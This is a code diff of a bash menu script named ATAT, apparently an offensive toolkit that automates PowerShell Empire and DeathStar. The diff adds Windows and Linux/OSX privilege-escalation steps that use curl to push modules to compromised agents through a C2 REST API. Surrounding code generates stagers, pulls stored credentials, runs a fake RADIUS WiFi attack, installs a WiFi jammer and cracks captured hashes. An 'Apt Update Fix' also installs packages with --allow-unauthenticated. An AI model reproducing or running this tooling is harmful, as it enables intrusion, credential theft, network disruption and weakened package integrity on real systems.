@@ -164,7 +164,7 @@ cat << "EOF"
        .       ``.b.                           :..-  :'  P
             .   `q.>b         .               `^^^:::::,'       .
                   ""^^               .                     .
-  .                                           .               .       .
+  .                        By 3N|GmA          .               .       .
     .         .          .                 .        +         .
 EOF
 fi 
@@ -191,8 +191,8 @@ echo -e "\E[1;34m===\e[97m[9] \e[95mEmpire & DeathStar  \e[97m  [Pledge Your All
 tput sgr0
 echo -e "\E[1;34m:::\e[97m[10]\e[31mWireless Attacks      \e[97m[Rule The Airwaves]   \E[1;34m"
 tput sgr0
-#echo -e "\E[1;34m===\e[97m[11]\e[90mMulti-Target Java RMI \e[97m[Fire 1 RMI Exploit at Many Targets]   \E[1;34m"
-#tput sgr0
+echo -e "\E[1;34m===\e[97m[0] \e[90mExit                   \e[97m[Exit ATAT]   \E[1;34m"
+tput sgr0
 #echo -e "\E[1;34m:::\e[97m[12]\e[32mMulti-Target SNMP Enum\e[97m[SNMP Enumerate Many Targets]   \E[1;34m"
 #tput sgr0
 #echo -e "\E[1;34m===\e[97m[13]\e[34mLoad Balance Detection\e[97m[Run LBD Against Many Targets]  \E[1;34m"
@@ -871,8 +871,8 @@ done
   echo -e "\E[1;34m::::: \e[97mCheck for Dependencies\E[1;34m:::::"
   echo -e "\E[1;34m::::: \e[97mPowershell Empire & DeathStar Option Should Only Be Run If You Are Logged In As root!!\E[1;34m:::::"
 
-PS3='Enter your choice: ENTER=Options Menu | 6=Main Menu | 7=QUIT: '
-options=("Powershell Empire & DeathStar" "Dependencies" "DBD Installer" "Airgeddon Install Workaround" "WiFi Jammer Install" "Main Menu" "Quit") #"HostAPD-WPE via Github"
+PS3='Enter your choice: ENTER=Options Menu | 7=Main Menu | 8=QUIT: '
+options=("Powershell Empire & DeathStar" "Dependencies" "DBD Installer" "Airgeddon Install Workaround" "WiFi Jammer Install" "Apt Update Fix" "Main Menu" "Quit") #"HostAPD-WPE via Github"
 select opt in "${options[@]}"
 do
     case $opt in
@@ -882,7 +882,7 @@ do
 		git clone https://github.com/byt3bl33d3r/DeathStar ~/DeathStar
 		cd ~/DeathStar && pip install -r requirements.txt && pip3 install -r requirements.txt
 		cd ..
-		echo -e "\e[1;34m[*] Installing Powershell Empire & DeathStar...\e[0m\n"
+		echo -e "\e[1;34m[*] Install Of Powershell Empire & DeathStar Complete\e[0m\n"
 			;;
         "Dependencies")
 		clear
@@ -900,7 +900,7 @@ do
 		mkdir /tmp/ATAT/
 		echo ""
 
-	reqs="gcc gcc-mingw-w64-i686 curl jq bettercap libssl-dev libnl-genl-3-dev hostapd-wpe lynx airgeddon hostapd lighttpd asleap python-pip python-scapy"
+	reqs="gcc gcc-mingw-w64-i686 curl jq bettercap libssl-dev libnl-genl-3-dev hostapd-wpe lynx airgeddon hostapd lighttpd asleap python-pip python-scapy gawk"
 	for i in $reqs; do
 		dpkg -s "$i" &> /tmp/ATAT/$i-install.txt
 		isinstalled=$(cat /tmp/ATAT/$i-install.txt | grep -o "Status: install ok installed")
@@ -970,22 +970,26 @@ do
 		#echo -e "\e[1;34m[*] Installing & Patching HostAPD-WPE ...\e[0m\n"
 			#;;
 		"Airgeddon Install Workaround")
-		rm airgeddon_*_all.deb airgeddon.deb
-		wget https://raw.githubusercontent.com/v1s1t0r1sh3r3/airgeddon/master/binaries/kali/airgeddon_{8..10}.{0..4}{0..4}-{0..3}_all.deb 
-        #The above command will need to be periodically updated as the major version goes beyond 8-10. This is hacky and terribly wasteful from a resource perspective; but will do for the time being.
-        mv airgeddon_*_all.deb airgeddon.deb
-		chmod +x airgeddon.deb
-		dpkg -i airgeddon.deb
-		echo -e "\e[1;34m[*] Installing Airgeddon ...\e[0m\n"
-		echo -e "\e[1;34m[*] If Airgeddon Workaround fails, manually navigate to https://github.com/v1s1t0r1sh3r3/airgeddon/tree/master/binaries/kali/ ...\e[0m\n"
-		echo -e "\e[1;34m[*] Download Current airgeddon_#.##-#_all.deb file, then run with e[31m dpkg -i airgeddon*.deb\e[97m...\e[0m\n"
+	rm airgeddon_*_all.deb airgeddon.deb
+	wget https://raw.githubusercontent.com/v1s1t0r1sh3r3/airgeddon/master/binaries/kali/airgeddon_{8..10}.{0..4}{0..4}-{0..3}_all.deb 
+    #The above command will need to be periodically updated as the major version goes beyond 8-10. This is hacky and terribly wasteful from a resource perspective; but will do for the time being.
+    mv airgeddon_*_all.deb airgeddon.deb
+	chmod +x airgeddon.deb
+	dpkg -i airgeddon.deb
+	echo -e "\e[1;34m[*] Install Of Airgeddon Complete\e[0m\n"
+	echo -e "\e[1;34m[*] If Airgeddon Workaround fails, manually navigate to https://github.com/v1s1t0r1sh3r3/airgeddon/tree/master/binaries/kali/ ...\e[0m\n"
+	echo -e "\e[1;34m[*] Download Current airgeddon_#.##-#_all.deb file, then run with e[31m dpkg -i airgeddon*.deb\e[97m...\e[0m\n"
 			;;
 		"WiFi Jammer Install")
-		git clone https://github.com/MisterBianco/wifijammer-ng ~/wifijammer-ng
-		cd ~/wifijammer-ng
-		pip install -r requirements.txt
-		chmod +x wifijammer.py && chmod +x wifijammer-ng.py
-		echo -e "\e[1;34m[*] Installing WiFiJammer-ng ...\e[0m\n"
+	git clone https://github.com/MisterBianco/wifijammer-ng ~/wifijammer-ng
+	cd ~/wifijammer-ng
+	pip install -r requirements.txt
+	chmod +x wifijammer.py && chmod +x wifijammer-ng.py
+	echo -e "\e[1;34m[*] Install Of WiFiJammer-ng Complete\e[0m\n"
+			;;
+		"Apt Update Fix")
+	rm -rf /var/lib/apt/lists && apt-get update && apt-get install kali-archive-keyring -y --allow-unauthenticated && apt-get install dirmngr --install-recommends -y --allow-unauthenticated && apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6
+	echo -e "\e[1;34m[*] Process Complete. This Should Only Ever Need To Be Run ONCE!\e[0m\n"
 			;;
 		"Main Menu")
             ~/ATAT/ATAT.sh
@@ -1007,8 +1011,8 @@ echo -e "\E[1;34m::::: \e[97mTHIS SECTION ONLY WORKS FROM THE /root/ CONTEXT!! \
 echo -e "\E[1;34m::::: \e[97mIF YOU'RE NOT LOGGED IN AS root, DO NOT USE THESE OPTIONS!! \E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mOnly Launch DeathStar (Step 2) If Your Goal Is To Automate Domain Admin Credential Acquisition \E[1;34m:::::"
 
-PS3='Enter your choice: ENTER=Options Menu | 19=Main Menu | 20=QUIT: '
-options=("Step 1 - Launch Powershell Empire & RESTful API" "Step 2 - Launch DeathStar (Optional)" "Step 3 - Acquire PSE REST API Permanent Token" "Start PSE Listener" "Get PSE Stagers" "Get PSE Agents" "Rename PSE Agent" "Generate PSE Stagers - Windows (mostly)" "Generate PSE Stagers - Windows/OSX/Linux" "Generate PSE Stagers - Windows Office File & CSharp Payload" "Windows Post-Exploitation" "Linux/OSX Post-Exploitation" "Get Post Ex Results From PSE Agent" "Get PSE Stored Credentials" "Kill PSE Listener" "Kill All PSE Listeners" "Restart PSE RESTful API" "Shutdown PSE RESTful API" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 21=Main Menu | 22=QUIT: '
+options=("Step 1 - Launch Powershell Empire & RESTful API" "Step 2 - Launch DeathStar (Optional)" "Step 3 - Acquire PSE REST API Permanent Token" "Start PSE Listener" "Get PSE Stagers" "Get PSE Agents" "Rename PSE Agent" "Generate PSE Stagers - Windows (mostly)" "Generate PSE Stagers - Windows/OSX/Linux" "Generate PSE Stagers - Windows Office File & CSharp Payload" "Windows Post-Exploitation" "Linux/OSX Post-Exploitation" "Get Post Ex Results From PSE Agent" "Get PSE Stored Credentials" "Windows Privilege Escalation" "Linux/OSX Privilege Escalation" "Kill PSE Listener" "Kill All PSE Listeners" "Restart PSE RESTful API" "Shutdown PSE RESTful API" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -1110,15 +1114,15 @@ do
 	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/$MODULE?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"'}' >> ~/ATAT/Linux_OSX_PSE_postex.log
 	sleep 10
 	done
-            echo -e "\E[1;34m::::: \e[97mxXx Powershell Agent Has Been Pillaged xXx\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mxXx Python Agent Has Been Pillaged xXx\E[1;34m:::::"
             echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once All Background Tasks Have Completed\E[1;34m:::::"
 			;;
 		"Get Post Ex Results From PSE Agent")
     pseauthtoken=~/ATAT/PSE_perm_token.txt
     read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'PSE Agent to Poll: ' useragent; 
 	curl --insecure -i https://$userlistener:$userport/api/agents/$useragent/results?token=$(cat $pseauthtoken)	| tee ~/ATAT/agent_results_pre.txt
-	awk '{gsub(/\\n/,"\n")}1' ~/ATAT/agent_results_pre.txt >> ~/ATAT/agent_results_pre1.txt
-	awk '{gsub(/\\r/,"\n")}1' ~/ATAT/agent_results_pre1.txt >> ~/ATAT/agent_results.txt
+	awk '{gsub(/\\n/,"\n")}1' ~/ATAT/agent_results_pre.txt >> ~/ATAT/agent_results_pre1.txt #Remove "\n" from output and replace it with a new line
+	awk '{gsub(/\\r/,"\n")}1' ~/ATAT/agent_results_pre1.txt >> ~/ATAT/agent_results.txt #Remove "\r" from output and replace it with a new line
 	rm ~/ATAT/agent_results_pre*.txt
             echo -e "\E[1;34m::::: \e[97mPSE Agent's Results Have Been Polled & Are Available In ~/ATAT/agent_results.txt\E[1;34m:::::"
 			;;
@@ -1127,6 +1131,30 @@ do
     read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; 
 	curl --insecure -i https://$userlistener:$userport/api/creds?token=$(cat $pseauthtoken) | tee ~/ATAT/PSE_creds.txt	
             echo -e "\E[1;34m::::: \e[97mAgents have been saved to ~/ATAT/PSE_creds.txt \E[1;34m:::::"
+			;;
+		"Windows Privilege Escalation")
+    inputfile=~/ATAT/PSE_windows_privesc.txt
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent;
+	for MODULE in $(cat $inputfile)
+	do
+	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/$MODULE?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"'}' >> ~/ATAT/Windows_PSE_privesc.log
+	sleep 10
+	done
+            echo -e "\E[1;34m::::: \e[97mxXx Powershell Agent Has Been (Hopefully) Escalated xXx\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once All Background Tasks Have Completed\E[1;34m:::::"
+			;;	
+		"Linux/OSX Privilege Escalation")
+    inputfile=~/ATAT/PSE_linux_osx_privesc.txt
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent;
+	for MODULE in $(cat $inputfile)
+	do
+	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/$MODULE?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"'}' >> ~/ATAT/Linux_OSX_PSE_privesc.log
+	sleep 10
+	done
+            echo -e "\E[1;34m::::: \e[97mxXx Python Agent Has Been (Hopefully) Escalated xXx\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once All Background Tasks Have Completed\E[1;34m:::::"
 			;;
 		"Kill PSE Listener")
     pseauthtoken=~/ATAT/PSE_perm_token.txt
@@ -1176,35 +1204,35 @@ select opt in "${options[@]}"
 do
     case $opt in
 		"Remove Wireless NIC from Network Manager")
-		#get MAC from wireless nic to be used in attack and add the MAC to /etc/NetworkManager/NetworkManager.conf (or where is best)
-		#[keyfile]
-		#unmanaged-devices=mac:00:11:22:33:44:55
-		echo -e "\E[1;34m::::: \e[97mCopy MAC address from the WLAN NIC interface you wish to use in your HostAPD-WPE attack\E[1;34m:::::"
-		ip addr
-		echo ""
-		echo -e "\E[1;34m::::: \e[97mFor ParrotOS & Distros That Auto Spoof MACs, Check 'Permanent MAC:' Value For Desired Interface To Be Sure You Have The Correct MAC. This WILL NOT WORK If You Enter A Spoofed MAC!\E[1;34m:::::"
-			read -p 'Enter WLAN NIC You Wish To Use (wlan0, wlan1, Etc.): ' userspnic;
-		macchanger -s $userspnic
-		echo -e "\E[1;34m::::: \e[97mPaste copied 'Permanent MAC' address from above into Set MAC for HostAPD-WPE Attacking WLAN NIC: prompt\E[1;34m:::::"
-			read -p 'Set MAC for HostAPD-WPE Attacking WLAN NIC: ' usermac;
-		mkdir -p /etc/NetworkManager/conf.d/
-		touch  /etc/NetworkManager/conf.d/NetworkManager.conf
-		echo [main] > /etc/NetworkManager/conf.d/NetworkManager.conf
-		echo plugins=ifupdown,keyfile >> /etc/NetworkManager/conf.d/NetworkManager.conf
-		echo  >> /etc/NetworkManager/conf.d/NetworkManager.conf
-		echo [ifupdown] >> /etc/NetworkManager/conf.d/NetworkManager.conf
-		echo managed=false >> /etc/NetworkManager/conf.d/NetworkManager.conf
-		echo  >> /etc/NetworkManager/conf.d/NetworkManager.conf
-		echo [keyfile] >> /etc/NetworkManager/conf.d/NetworkManager.conf
-		echo unmanaged-devices=mac:$usermac >> /etc/NetworkManager/conf.d/NetworkManager.conf
-		service NetworkManager restart	
+	#get MAC from wireless nic to be used in attack and add the MAC to /etc/NetworkManager/NetworkManager.conf (or where is best)
+	#[keyfile]
+	#unmanaged-devices=mac:00:11:22:33:44:55
+	echo -e "\E[1;34m::::: \e[97mCopy MAC address from the WLAN NIC interface you wish to use in your HostAPD-WPE attack\E[1;34m:::::"
+	ip addr
+	echo ""
+	echo -e "\E[1;34m::::: \e[97mFor ParrotOS & Distros That Auto Spoof MACs, Check 'Permanent MAC:' Value For Desired Interface To Be Sure You Have The Correct MAC. This WILL NOT WORK If You Enter A Spoofed MAC!\E[1;34m:::::"
+		read -p 'Enter WLAN NIC You Wish To Use (wlan0, wlan1, Etc.): ' userspnic;
+	macchanger -s $userspnic
+	echo -e "\E[1;34m::::: \e[97mPaste copied 'Permanent MAC' address from above into Set MAC for HostAPD-WPE Attacking WLAN NIC: prompt\E[1;34m:::::"
+		read -p 'Set MAC for HostAPD-WPE Attacking WLAN NIC: ' usermac;
+	mkdir -p /etc/NetworkManager/conf.d/
+	touch  /etc/NetworkManager/conf.d/NetworkManager.conf
+	echo [main] > /etc/NetworkManager/conf.d/NetworkManager.conf
+	echo plugins=ifupdown,keyfile >> /etc/NetworkManager/conf.d/NetworkManager.conf
+	echo  >> /etc/NetworkManager/conf.d/NetworkManager.conf
+	echo [ifupdown] >> /etc/NetworkManager/conf.d/NetworkManager.conf
+	echo managed=false >> /etc/NetworkManager/conf.d/NetworkManager.conf
+	echo  >> /etc/NetworkManager/conf.d/NetworkManager.conf
+	echo [keyfile] >> /etc/NetworkManager/conf.d/NetworkManager.conf
+	echo unmanaged-devices=mac:$usermac >> /etc/NetworkManager/conf.d/NetworkManager.conf
+	service NetworkManager restart	
 		    ;;
 		"Reset Wireless NIC for Network Manager Usage")
-		#get MAC from wireless nic used in attack and remove the MAC from /etc/NetworkManager/NetworkManager.conf (or where is best)
-		#[keyfile]
-		#unmanaged-devices=mac:00:11:22:33:44:55
-		rm /etc/NetworkManager/conf.d/NetworkManager.conf
-		service NetworkManager restart
+	#get MAC from wireless nic used in attack and remove the MAC from /etc/NetworkManager/NetworkManager.conf (or where is best)
+	#[keyfile]
+	#unmanaged-devices=mac:00:11:22:33:44:55
+	rm /etc/NetworkManager/conf.d/NetworkManager.conf
+	service NetworkManager restart
 		    echo -e "\E[1;34m::::: \e[97mWireless NIC Reset To Managed Mode\E[1;34m:::::"
 		    ;;
         "HostAPD-WPE Enterprise WiFi Fake RADIUS Server Attack")
@@ -1217,11 +1245,11 @@ do
 	sed -i "/jtr NETNTLM:/s/jtr NETNTLM:/""/g" ~/ATAT/john_users.txt
 	        echo -e "\E[1;34m::::: \e[97mRun Multi-Target Asleap or John The Ripper To Recover Passwords From Collected Challenge/Response Pairs\E[1;34m:::::"
             ;;
-    "Airgeddon")
+		"Airgeddon")
     echo -e "\E[1;34m::::: \e[97mLaunching Airgeddon!!\E[1;34m:::::"
 	bash airgeddon
             ;;
-    "Multi-Target Asleap Attack")
+		"Multi-Target Asleap Attack")
     read -p 'Set Path To Wordlist: ' wordlist;
     echo -e "\E[1;34m::::: \e[97mCracking Passwords!!\E[1;34m:::::"
     inputfile=~/ATAT/asleap_users.txt
@@ -1233,7 +1261,7 @@ do
 	done
 	        echo -e "\E[1;34m::::: \e[97mAsleap Output & All Cracked Passwords Located in ~/ATAT/asleap_cracked.txt\E[1;34m:::::"
             ;;
-    "Multi-Target John The Ripper Attack")
+		"Multi-Target John The Ripper Attack")
     read -p 'Set Path To Wordlist: ' wordlist;
     echo -e "\E[1;34m::::: \e[97mCracking Passwords!!\E[1;34m:::::"
     inputfile=~/ATAT/john_users.txt
@@ -1260,6 +1288,13 @@ do
     esac
 done 
   
+;;
+
+"0" | "0" )
+  # 
+    echo -e "\E[1;34m::::: \e[97mIt's Over For Now... \E[1;34m:::::"
+    echo "Aufiederszehn" && exit 1 
+
 ;;
    
 esac
